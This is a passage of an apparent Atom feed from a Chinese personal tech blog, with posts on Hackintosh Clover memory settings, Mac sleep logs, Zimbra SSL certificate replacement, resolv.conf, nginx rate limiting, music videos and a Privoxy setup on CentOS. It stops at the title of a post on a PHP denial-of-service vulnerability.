class="title">key</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="title">array</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">dict</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="title">key</span>&gt;</span>Slot<span class="tag">&lt;/<span class="title">key</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="title">integer</span>&gt;</span>0<span class="tag">&lt;/<span class="title">integer</span>&gt;</span> OR <span class="tag">&lt;<span class="title">string</span>&gt;</span>5<span class="tag">&lt;/<span class="title">string</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="title">key</span>&gt;</span>Size<span class="tag">&lt;/<span class="title">key</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="title">integer</span>&gt;</span>2048<span class="tag">&lt;/<span class="title">integer</span>&gt;</span> OR <span class="tag">&lt;<span class="title">string</span>&gt;</span>4096<span class="tag">&lt;/<span class="title">string</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="title">key</span>&gt;</span>Frequency<span class="tag">&lt;/<span class="title">key</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="title">integer</span>&gt;</span>1600<span class="tag">&lt;/<span class="title">integer</span>&gt;</span> OR <span class="tag">&lt;<span class="title">string</span>&gt;</span>1333<span class="tag">&lt;/<span class="title">string</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="title">key</span>&gt;</span>Vendor<span class="tag">&lt;/<span class="title">key</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="title">string</span>&gt;</span>Some Company<span class="tag">&lt;/<span class="title">string</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="title">key</span>&gt;</span>Part<span class="tag">&lt;/<span class="title">key</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="title">string</span>&gt;</span>123456ABCDEF<span class="tag">&lt;/<span class="title">string</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="title">key</span>&gt;</span>Serial<span class="tag">&lt;/<span class="title">key</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="title">string</span>&gt;</span>ABCDEF123456<span class="tag">&lt;/<span class="title">string</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="title">key</span>&gt;</span>Type<span class="tag">&lt;/<span class="title">key</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="title">string</span>&gt;</span>DDR/DDR2/DDR3<span class="tag">&lt;/<span class="title">string</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="title">dict</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="title">array</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">dict</span>&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>Inject custom memory module tables into SMBIOS if original SPD and SMBIOS provide incorrect or incomplete information.</p>
</blockquote>
<ul>
<li><code>Channels</code> - Number of hardware channels supported by your memory chipset, usually two.</li>
<li><code>SlotCount</code> - Total count of memory slots in your system. Max 24 (for now).</li>
<li><code>Modules</code> - An array of INSTALLED modules, if your slot is empty don’t include an entry for it.</li>
</ul>
<blockquote>
<p>For each module:</p>
</blockquote>
<ul>
<li><code>Slot</code> - Physical slot location in which the module is installed.</li>
<li><code>Size</code> - Size of the module in megabytes.</li>
<li><code>Frequency</code> - Speed of the module in megahertz.</li>
<li><code>Vendor</code> - Memory manufacturer name</li>
<li><code>Part</code> - The part number identifier.</li>
<li><code>Serial</code> - The module’s serial number.</li>
<li><code>Type</code> - The memory module’s type.</li>
</ul>
<h2 id="解决问题">解决问题</h2><ol>
<li>上面的配置中，发现是可以配置内存位置的。</li>
<li>拆了主机，发现这台主机内存插在第二根插槽上，也就是第1槽。按正常的开机顺序，应该是先去引导第0槽，默认是离CPU最近的那根槽。</li>
<li>抱着怀疑的态度把内存换到了第0槽，开机。</li>
<li>卧槽，真的可以了！</li>
</ol>
]]></content>
    <summary type="html">
    <![CDATA[黑苹果Clover无法引导安装镜像，反复重启]]>
    
    </summary>
    
      <category term="Clover" scheme="http://www.inorz.net/tags/Clover/"/>
    
      <category term="黑苹果" scheme="http://www.inorz.net/tags/%E9%BB%91%E8%8B%B9%E6%9E%9C/"/>
    
      <category term="工具使用" scheme="http://www.inorz.net/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[MAC查看休眠日志]]></title>
    <link href="http://www.inorz.net/2016/03/24/mac-sleep/"/>
    <id>http://www.inorz.net/2016/03/24/mac-sleep/</id>
    <published>2016-03-24T03:15:48.000Z</published>
    <updated>2016-03-24T04:04:16.000Z</updated>
    <content type="html"><![CDATA[<ol>
<li>有同鞋反馈说MAC开发机经常无故连不上，失去响应。</li>
<li>每次我这边远程桌面一连，那边就反馈登录正常了。于是怀疑是系统自动休眠了。</li>
<li>通过下面操作可查到系统是否休眠了。</li>
</ol>
<a id="more"></a>
<ul>
<li>执行下面这条命令</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">syslog |grep -Ei <span class="string">"Wake reason|sleep"</span></span><br></pre></td></tr></table></figure>
<ul>
<li>执行了上面这条命令，可以看到“Wake reason=”旁边的一些代码（红色字），那么这些代码表示什么意思呢？<ul>
<li><code>OHC</code>：表示开放式主机控制器（Open Host Controller），它通常和USB或火线有关，如果你看到的是OHC1或OHC2则基本上是USB外接键盘或鼠标导致唤醒了您的Mac。</li>
<li><code>EHC</code>：表示增强的主机控制器（Enhanced Host Controller），这是另一种USB接口，但也可以是无线或蓝牙设备，因为它们均隶属于Mac的USB总线。（新版系统好像全部由XHC取代OHC和EHC了，不再细分，求证实）</li>
<li><code>USB</code>：一个USB设备唤醒了Mac。</li>
<li><code>LID0</code>：字面意思是MB或MBP的盖子，代表您打开盖子使机器唤醒了。（实际上在新版系统，开盖唤醒对应的代码应该是EC.LidOpen (User)）</li>
<li><code>PWRB</code>：表示电源按钮（Power Button）。</li>
<li><code>RTC</code>：实时时钟（Real Time Clock Alarm），一般是由会唤醒机器的服务导致的，诸如“节能器”控制台（位于系统偏好设置中）设定的定时睡眠或唤醒。也可以由已启用的设定、用户的应用程序、备份任务以及其它计划任务触发。</li>
<li><code>EC.ACAttach (Maintenance)/EC.ACDetach (Maintenance)</code>：连接/断开电源适配器（维护），会导致短暂的唤醒（就几秒，随后继续睡回笼觉，无需在意）。当外接电源发生变化时，系统短暂唤醒一下，然后调整电源管理方案（如是否启用Power Nap，各USB设备、Thunderbolt设备、蓝牙设备、无线网络、Airport、netbios等工作方式），调整完毕后继续睡眠。</li>
</ul>
</li>
</ul>
<blockquote>
<p>你可能会看到其它代码（诸如<code>PCI</code>、<code>GEGE</code>等），但上述代码是大多数人会在系统日志里遇到的。一旦你看到这些代码，你可以缩小查找范围。</p>
<p>PS：最后查到果然是因为系统自动休眠了，改了一下休眠设置。解决！</p>
</blockquote>
]]></content>
    <summary type="html">
    <![CDATA[MAC查看休眠日志]]>
    
    </summary>
    
      <category term="MAC" scheme="http://www.inorz.net/tags/MAC/"/>
    
      <category term="休眠" scheme="http://www.inorz.net/tags/%E4%BC%91%E7%9C%A0/"/>
    
      <category term="工具使用" scheme="http://www.inorz.net/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[【Zimbra】更换邮箱SSL证书]]></title>
    <link href="http://www.inorz.net/2015/11/05/zimbra-change-ssl/"/>
    <id>http://www.inorz.net/2015/11/05/zimbra-change-ssl/</id>
    <published>2015-11-05T12:05:48.000Z</published>
    <updated>2015-11-04T10:40:53.000Z</updated>
    <content type="html"><![CDATA[<p>　　有台用zimbra部署的邮箱服务器证书马上到期了，之前用的StartSSL突然抽风，不知为何不能申请证书了。于是临时换用了沃通的免费证书来应急一下。<br>　　中间遇到了些困难，主要是被网上搜索的一些文章给误导了，失败了无数次。<br>　　记录下更换过程。</p>
<h3 id="申请证书">申请证书</h3><ol>
<li>先到沃通官网申请证书<a href="https://buy.wosign.com/free/#ssl" target="_blank" rel="external">点此跳转</a></li>
<li>按上面的要求一步步申请完证书</li>
<li>证书下载回来后,打开文件选择解压for Other Apache.zip, 其中有3个文件:<blockquote>
<p>根证书：1_root_bundle.crt<br>公钥证书：2_domain.com.crt<br>私钥：3_domain.com.key</p>
</blockquote>
</li>
</ol>
<a id="more"></a>
<h3 id="替换证书">替换证书</h3><ol>
<li>把上面解压出来的三个文件上传到服务器</li>
<li><p><a href="http://www.wosign.com/root/startcom.crt" target="_blank" rel="external">下载</a> 顶级根证书,然后把顶级根证书的内容加到公钥证书中</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat startcom.crt &gt;&gt; <span class="number">2</span>_domain.com.crt</span><br></pre></td></tr></table></figure>
</li>
<li><p>替换服务器上旧的私钥文件</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv /opt/zimbra/ssl/zimbra/commercial/commercial.key /data/backup/commercial.key.$&#123;RANDOM&#125;&#10;cp 3_domain.com.key /opt/zimbra/ssl/zimbra/commercial/commercial.key</span><br></pre></td></tr></table></figure>
</li>
<li><p>校验证书</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/opt/zimbra/bin/zmcertmgr verifycrt comm /opt/zimbra/ssl/zimbra/commercial/commercial.key <span class="number">2</span>_domain.com.crt <span class="number">1</span>_root_bundle.crt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 校验成功会有这样的提示</span></span><br><span class="line">** Verifying <span class="number">2</span>_domain.com.crt against /opt/zimbra/ssl/zimbra/commercial/commercial.key</span><br><span class="line">Certificate (<span class="number">2</span>_domain.com.crt) and private key (/opt/zimbra/ssl/zimbra/commercial/commercial.key) match.</span><br><span class="line">Valid Certificate: <span class="number">2</span>_domain.com.crt: OK</span><br></pre></td></tr></table></figure>
</li>
<li><p>更新证书</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">/opt/zimbra/bin/zmcertmgr deploycrt comm <span class="number">2</span>_domain.com.crt <span class="number">1</span>_root_bundle.crt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新成功会有这样的提示</span></span><br><span class="line">** Verifying <span class="number">2</span>_domain.com.crt against /opt/zimbra/ssl/zimbra/commercial/commercial.key</span><br><span class="line">Certificate (<span class="number">2</span>_domain.com.crt) and private key (/opt/zimbra/ssl/zimbra/commercial/commercial.key) match.</span><br><span class="line">Valid Certificate: <span class="number">2</span>_domain.com.crt: OK</span><br><span class="line">** Copying <span class="number">2</span>_domain.com.crt to /opt/zimbra/ssl/zimbra/commercial/commercial.crt</span><br><span class="line">** Appending ca chain <span class="number">1</span>_root_bundle.crt to /opt/zimbra/ssl/zimbra/commercial/commercial.crt</span><br><span class="line">** Importing certificate /opt/zimbra/ssl/zimbra/commercial/commercial_ca.crt to CACERTS as zcs-user-commercial_ca...done.</span><br><span class="line">** NOTE: mailboxd must be restarted <span class="keyword">in</span> order to use the imported certificate.</span><br><span class="line">** Saving server config key zimbraSSLCertificate...done.</span><br><span class="line">** Saving server config key zimbraSSLPrivateKey...done.</span><br><span class="line">** Installing mta certificate and key...done.</span><br><span class="line">** Installing slapd certificate and key...done.</span><br><span class="line">** Installing proxy certificate and key...done.</span><br><span class="line">** Creating pkcs12 file /opt/zimbra/ssl/zimbra/jetty.pkcs12...done.</span><br><span class="line">** Creating keystore file /opt/zimbra/mailboxd/etc/keystore...done.</span><br><span class="line">** Installing CA to /opt/zimbra/conf/ca...done.</span><br></pre></td></tr></table></figure>
</li>
<li><p>重启zmcontrol</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su - zimbra&#10;zmcontrol restart</span><br></pre></td></tr></table></figure>
</li>
<li><p>重启完了后重启登录页面,可以看到邮箱证书已经替换成功</p>
</li>
</ol>
]]></content>
    <summary type="html">
    <![CDATA[更换zimbra的ssl证书]]>
    
    </summary>
    
      <category term="zimbra" scheme="http://www.inorz.net/tags/zimbra/"/>
    
      <category term="工具使用" scheme="http://www.inorz.net/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[【DNS】resolv.conf 配置说明[转]]]></title>
    <link href="http://www.inorz.net/2015/09/06/resolv/"/>
    <id>http://www.inorz.net/2015/09/06/resolv/</id>
    <published>2015-09-06T04:05:48.000Z</published>
    <updated>2016-04-01T07:12:28.000Z</updated>
    <content type="html"><![CDATA[<p>　　对这个一开始是一种半解的，看了<a href="http://www.lnmpy.com/resolv.conf-search-domain/" target="_blank" rel="external">这篇文章</a>后觉得有用，就转了过来记录一下。</p>
<h3 id="配置说明">配置说明</h3><ol>
<li>“nameserver” 指定要进行域名解析的dnsserver的IP地址。可以定义多个IP地址，按照顺序来请求</li>
<li>“domain” 指定本地的domain，如果查询时的域名没有包含”.”，则会在此后面加上domain的值来进行解析</li>
<li>“search” 若搜索的域名没有找到，则将域名拼接上search来搜索。下面会有例子来说明。</li>
</ol>
<a id="more"></a>
<p>现实中有”qh.inorz.net”，下面就以这个来说明，主要是说明”domain”和”search”的意义。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/resolv.conf</span><br><span class="line"></span><br><span class="line"><span class="comment">########</span></span><br><span class="line">nameserver <span class="number">192.168</span>.<span class="number">1.1</span></span><br><span class="line">nameserver <span class="number">8.8</span>.<span class="number">8.8</span></span><br><span class="line">domain  inorz.net</span><br><span class="line">search  baidu.com inorz.net.cn</span><br></pre></td></tr></table></figure>
<h3 id="测试">测试</h3><ol>
<li><p>ping inorz.net</p>
<blockquote>
<p>这里是直接走的 nameserver</p>
</blockquote>
</li>
<li><p>ping qh</p>
<blockquote>
<p>按顺序查找 qh, qh.inorz.net, qh.baidu.com 和 qh.inorz.net.cn<br>这里的顺序是nameserver -&gt; domain -&gt; search</p>
</blockquote>
</li>
<li><p>ping qh.inorz</p>
<blockquote>
<p>此处就只查找 qh.inorz，qh.inorz.inorz.net 和 qh.inorz.baidu.com<br>这里的顺序是nameserver -&gt; domain -&gt; search<br>domain此时没有起到作用，因为其定义是当搜索的domain没有”.”时，则优先搜索domain，否则跳过</p>
</blockquote>
</li>
</ol>
]]></content>
    <summary type="html">
    <![CDATA[简单说明一下 resolv.conf 配置]]>
    
    </summary>
    
      <category term="DNS" scheme="http://www.inorz.net/tags/DNS/"/>
    
      <category term="dns" scheme="http://www.inorz.net/tags/dns/"/>
    
      <category term="resolv" scheme="http://www.inorz.net/tags/resolv/"/>
    
      <category term="resolv.conf" scheme="http://www.inorz.net/tags/resolv-conf/"/>
    
      <category term="工具使用" scheme="http://www.inorz.net/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[使用nginx的limit模块限制并发]]></title>
    <link href="http://www.inorz.net/2015/08/19/nginx-module-limit/"/>
    <id>http://www.inorz.net/2015/08/19/nginx-module-limit/</id>
    <published>2015-08-19T14:15:48.000Z</published>
    <updated>2016-04-10T07:50:24.000Z</updated>
    <content type="html"><![CDATA[<h2 id="【遇到的问题】">【遇到的问题】</h2><ol>
<li>当前系统被高强度频繁的调用API</li>
<li>当前系统API经常被各种扫描请求</li>
</ol>
<h2 id="【如何解决】">【如何解决】</h2><ol>
<li>使用nginx的limit模块限制并发</li>
<li>只限制部分地址或是只限制部分IP（白名单或黑名单）</li>
</ol>
<a id="more"></a>
<h2 id="【配置方法】">【配置方法】</h2><p>1、 <code>vi nginx/conf/limit/black_ip.conf</code><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168</span>.<span class="number">8</span>.xxx <span class="number">1</span>;</span><br><span class="line"><span class="number">192.168</span>.<span class="number">8</span>.xxx <span class="number">1</span>;</span><br></pre></td></tr></table></figure></p>
<p>2、 <code>vi nginx/conf/limit/limit_zone.conf</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">geo <span class="variable">$blackiplist</span>  &#123;</span><br><span class="line">    default <span class="number">0</span>;</span><br><span class="line">    include <span class="built_in">limit</span>/black_ip.conf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">map <span class="variable">$blackiplist</span> <span class="variable">$limit</span> &#123;</span><br><span class="line">    <span class="number">1</span> <span class="variable">$binary_remote_addr</span>;</span><br><span class="line">    <span class="number">0</span> <span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">limit</span>_req_zone <span class="variable">$limit</span> zone=perreq:<span class="number">100</span>m rate=<span class="number">3000</span>r/s;     <span class="comment">#黑名单内的IP每秒最多处理 3000 个请求</span></span><br><span class="line"><span class="built_in">limit</span>_conn_zone <span class="variable">$limit</span> zone=perip:<span class="number">100</span>m;</span><br></pre></td></tr></table></figure>
<p>3、 <code>vi nginx/conf/limit/limit_location.conf</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">limit</span>_conn perip <span class="number">3000</span>;        <span class="comment"># 黑名单的IP,每个IP最大并发为2000</span></span><br><span class="line"><span class="built_in">limit</span>_req zone=perreq nodelay;</span><br></pre></td></tr></table></figure>
<p>4、 修改 <code>nginx/conf/nginx.conf</code>，http { … } 区域添加下面配置：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include <span class="built_in">limit</span>/<span class="built_in">limit</span>_zone.conf;</span><br></pre></td></tr></table></figure></p>
<p>5、 最后在需要限制的虚拟主机里，对应要限制的路径下面添加配置用于限制。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include <span class="built_in">limit</span>/<span class="built_in">limit</span>_location.conf;</span><br></pre></td></tr></table></figure>
<h3 id="【配置说明】">【配置说明】</h3><ol>
<li>里面使用到了 geo指令定义黑名单 \$blackiplist 的变量，默认值为0，如果客户端IP在上面的范围内，\$blackiplist 的值为1</li>
<li>使用map指令映射【黑名单里IP】显示为真实的IP，如果不是黑名单里的IP就为空，这样【除了黑名单里的IP】都不能存到limit_req_zone内存session中，所以不会限制黑名单之外的ip访问</li>
</ol>
]]></content>
    <summary type="html">
    <![CDATA[使用nginx的limit模块限制并发]]>
    
    </summary>
    
      <category term="limit" scheme="http://www.inorz.net/tags/limit/"/>
    
      <category term="nginx" scheme="http://www.inorz.net/tags/nginx/"/>
    
      <category term="并发" scheme="http://www.inorz.net/tags/%E5%B9%B6%E5%8F%91/"/>
    
      <category term="工具使用" scheme="http://www.inorz.net/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[See you Again]]></title>
    <link href="http://www.inorz.net/2015/05/24/see-you-again/"/>
    <id>http://www.inorz.net/2015/05/24/see-you-again/</id>
    <published>2015-05-24T06:35:48.000Z</published>
    <updated>2015-10-28T08:37:37.000Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>看过速度7的朋友一定会对这首see you again印象非常深刻。这里找了几个版本的歌曲，可以一饱耳福了。<br>废话不多说了，下面的视频献上。</p>
</blockquote>
<a id="more"></a>
<h3 id="【粤语版】">【粤语版】</h3><p>&gt;</p>
<embed src="http://player.youku.com/player.php/sid/XOTYyMTUxNzY4/v.swf" allowfullscreen="true" quality="high" width="480" height="400" align="middle" allowscriptaccess="always" type="application/x-shockwave-flash">


<h3 id="【中文版】">【中文版】</h3><p>&gt;</p>
<embed src="http://player.youku.com/player.php/sid/XOTQ3MDU3NzI0/v.swf" allowfullscreen="true" quality="high" width="480" height="400" align="middle" allowscriptaccess="always" type="application/x-shockwave-flash">


<h3 id="【再来个原版】">【再来个原版】</h3><p>&gt;</p>
<embed src="http://player.youku.com/player.php/sid/XOTI5NDM0MDk2/v.swf" allowfullscreen="true" quality="high" width="480" height="400" align="middle" allowscriptaccess="always" type="application/x-shockwave-flash">
]]></content>
    <summary type="html">
    <![CDATA[See you Again各种版本]]>
    
    </summary>
    
      <category term="主题曲" scheme="http://www.inorz.net/tags/%E4%B8%BB%E9%A2%98%E6%9B%B2/"/>
    
      <category term="分享" scheme="http://www.inorz.net/tags/%E5%88%86%E4%BA%AB/"/>
    
      <category term="速7" scheme="http://www.inorz.net/tags/%E9%80%9F7/"/>
    
      <category term="音乐" scheme="http://www.inorz.net/tags/%E9%9F%B3%E4%B9%90/"/>
    
      <category term="音乐" scheme="http://www.inorz.net/categories/%E9%9F%B3%E4%B9%90/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Centos下Privoxy的安装与配置]]></title>
    <link href="http://www.inorz.net/2015/05/24/init-privoxy-to-centos/"/>
    <id>http://www.inorz.net/2015/05/24/init-privoxy-to-centos/</id>
    <published>2015-05-24T05:25:48.000Z</published>
    <updated>2015-10-28T10:04:29.000Z</updated>
    <content type="html"><![CDATA[<h3 id="一、【背景】">一、【背景】</h3><p>　　手上有墙外的VPS可用，部署了shadowsocks（以下简称ss），从墙外使用rsync拉文件或是IOS（未越狱）想出墙时。都比较麻烦。于是看上了Privoxy这货。可以把socks5转换为HTTP代理，也就是俗称的APN。</p>
<p>步骤如下：</p>
<blockquote>
<ol>
<li>国外VPS机器分别安装ss服务端和客户端</li>
<li>客户端直接连本机服务端</li>
<li>部署Privoxy将ss客户端生成的sock5代理转成HTTP代理</li>
<li>rsync或IOS端直接连接国外VPS上的HTTP代理。<br>PS：如果手头还有国内VPS的话最好是客户端和Privoxy都在国内VPS上。代理这块就比较少被检验。</li>
</ol>
</blockquote>
<a id="more"></a>
<p>　　ss的安装和配置这里就不叙述了，因为过程和配置比较简单。这篇主要还是说说负责 Privoxy 安装与设置吧。</p>
<h3 id="二、【安装】">二、【安装】</h3><p>　　Privoxy 是一个轻量级的代理服务，不需要大量的内存进行缓存，是开源项目，官方介绍如下：</p>
<blockquote>
<p>Privoxy是一款带过滤功能的代理服务器，针对HTTP、HTTPS协议，经常跟Tor组合使用。通过Privoxy的超级过滤功能，用户从而可以保护隐私、对网页内容进行过滤、管理cookies，以及拦阻各种广告等。Privoxy可以用作单机，也可以应用到多用户的网络。</p>
</blockquote>
<p>　　你可以在 <a href="http://sourceforge.net/projects/ijbswa/files/" target="_blank" rel="external">这里</a> 选择适合你的版本，目前基本可以算常用桌面全版本（Unix众，Win，MacOS）。这里我选择了源码安装的方式</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加一个用户给 Privoxy</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'privoxy:*:7777:7777:privoxy proxy:/no/home:/no/shell'</span> &gt;&gt; /etc/passwd</span><br><span class="line"><span class="comment"># 分配个组给 Privoxy</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'privoxy:*:7777:'</span> &gt;&gt; /etc/group</span><br><span class="line"><span class="comment"># 开始编译安装...</span></span><br><span class="line">autoheader</span><br><span class="line">autoconf</span><br><span class="line">./configure      <span class="comment"># (--help to see options)</span></span><br><span class="line">make             <span class="comment"># (the make from GNU, sometimes called gmake)</span></span><br><span class="line">make <span class="operator">-s</span> install  <span class="comment"># (to really install, -s to silence output)</span></span><br></pre></td></tr></table></figure>
<p>　　默认安装后相应的配置在 /usr/local/etc/privoxy 目录下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 运行</span></span><br><span class="line">/etc/init.d/privoxy start</span><br></pre></td></tr></table></figure>
<h3 id="三、【定制】">三、【定制】</h3><blockquote>
<p>根据我们的需求来定制一下配置（将ss的sock5转换为HTTP代理），加上用户密码。</p>
</blockquote>
<ol>
<li><p>配置HTTP代理端口</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi /usr/<span class="built_in">local</span>/etc/privoxy/config</span><br><span class="line"><span class="comment">#找到listen-address，配置HTTP代理的端口</span></span><br><span class="line">listen-address  <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">31904</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>向对应端口转发</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vi /usr/<span class="built_in">local</span>/etc/privoxy/config</span><br><span class="line"><span class="comment"># 找到forward-socks5，配置要转发的端口，及特地规则。具体使用场景可以参考官方配置里写上。</span></span><br><span class="line"><span class="comment"># 这里我们配置全局转发，目前是49879端口(ss客户端)</span></span><br><span class="line">forward-socks5t   /         <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">49879</span> .</span><br></pre></td></tr></table></figure>
</li>
<li><p>配置用户名和密码（如果做了防火墙只允许内部IP访问，或是免费开放给大家使用。可以无视这条）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成用户名和密码对应的base64密文</span></span><br><span class="line">perl <span class="operator">-e</span> <span class="string">"use MIME::Base64; print encode_base64('用户名:密码');"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改config文件，添加actionsfile user.action，编辑 user.action 文件中的 alias</span></span><br><span class="line">proxy = +forward-override&#123;forward <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">808</span>&#125; +add-header&#123;Proxy-authorization: Basic &lt;auth&gt;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 也可以IP段过滤, 打开配置，找到 permit-access,里面有对应的配置模板。</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>配置完了，重启下privoxy</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/privoxy restart</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="四、【如何使用HTTP代理】">四、【如何使用HTTP代理】</h3><ol>
<li><p>RSYNC代理</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> RSYNC_PROXY=<span class="string">'IP:PORT'</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>IOS上使用</p>
<blockquote>
<p>设置-WIFI-点中你连接的WIFI旁边的(i)进入WIFI设置-最下方HTTP代理-输入对应信息</p>
</blockquote>
</li>
</ol>
<h3 id="五、【FAQ】">五、【FAQ】</h3><ol>
<li><p>按上面的配置好了，还是连接不上<br>PS：检查一下端口和防火墙有没有添加上对应的规则</p>
</li>
<li><p>欢迎补充。</p>
</li>
</ol>
]]></content>
    <summary type="html">
    <![CDATA[将ss的socks5代理转换为HTTP代理]]>
    
    </summary>
    
      <category term="Privoxy" scheme="http://www.inorz.net/tags/Privoxy/"/>
    
      <category term="shadowsocks" scheme="http://www.inorz.net/tags/shadowsocks/"/>
    
      <category term="代理" scheme="http://www.inorz.net/tags/%E4%BB%A3%E7%90%86/"/>
    
      <category term="科学上网" scheme="http://www.inorz.net/tags/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"/>
    
      <category term="工具使用" scheme="http://www.inorz.net/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[【安全】PHP Multipartform-data 远程DOS攻击漏洞]]></title>
    <link href="http://www.inorz.net/2015/05/21/php-multipartform-data/"/>
    <id>http://www.inorz.net/2015/05/21/php-multipartform-data/</id>
    <published>2015-05-21T06:45:48.000Z</published>
    <updated>2015-10-28T10:04:40.000Z</updated>
